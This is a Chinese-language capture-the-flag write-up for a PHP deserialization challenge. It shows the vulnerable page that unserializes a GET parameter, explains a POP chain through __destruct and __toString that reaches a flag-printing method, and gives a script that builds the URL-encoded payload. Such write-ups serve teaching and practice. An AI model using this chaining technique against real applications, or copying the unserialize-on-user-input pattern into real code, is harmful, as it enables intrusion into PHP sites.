# 题目  
打开环境，发现下列代码  
```php
<?php

error_reporting(0);
show_source("index.php");

class w44m{

    private $admin = 'aaa';
    protected $passwd = '123456';

    public function Getflag(){
        if($this->admin === 'w44m' && $this->passwd ==='08067'){
            include('flag.php');
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo 'nono';
        }
    }
}

class w22m{
    public $w00m;
    public function __destruct(){
        echo $this->w00m;
    }
}

class w33m{
    public $w00m;
    public $w22m;
    public function __toString(){
        $this->w00m->{$this->w22m}();
        return 0;
    }
}

$w00m = $_GET['w00m'];
unserialize($w00m);
```

# 思路  

最终目标肯定是要执行w44m的Getflag函数，肯定是pop链调用，代码执行了一个反序列化的过程，没有__wakeup()函数，但是有__destruct()，这肯定就是链的入口，在w33m中有一个__toString()函数，如果w33m->w00m是一个w44m类，并且w33m->w22m是一个字符串"Getflag"，那么就可以通过调用w33m->toString()调用Getflag函数，要调用w33m->toString,可以将w22m->w00m设为一个w33m类。  
所以get传入w00m的值是一个w22m类反序列化的值，w22m->w00m是一个w33m对象，这个w33m对象的w00m是一个w44m对象，w22m为一个字符串，这个w44m对象的成员要符合条件  


# wP  
```php  
<?php

error_reporting(0);
show_source("index.php");

class w44m{

    private $admin = 'aaa';
    protected $passwd = '123456';

    public function Getflag(){
        if($this->admin === 'w44m' && $this->passwd ==='08067'){
            include('flag.php');
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo 'nono';
        }
    }
}

class w22m{
    public $w00m;
    public function __destruct(){
        echo $this->w00m;
    }
}

class w33m{
    public $w00m;
    public $w22m;
    public function __toString(){
        $this->w00m->{$this->w22m}();
        return 0;
    }
}

$w2=new w22m();
$w3=new w33m();
$w4=unserialize('O:4:"w44m":2:{s:5:"admin";s:4:"w44m";s:6:"passwd";s:5:"08067";}');

$w3->w00m=$w4;
$w3->w22m='Getflag';
$w2->w00m=$w3;

echo urlencode(serialize($w2));


```
因为w44m类的成员都是私有对象，如果直接new一个，就无法修改，所以要手动构造，最后要使用urlencode编码，否则会有不可打印字符

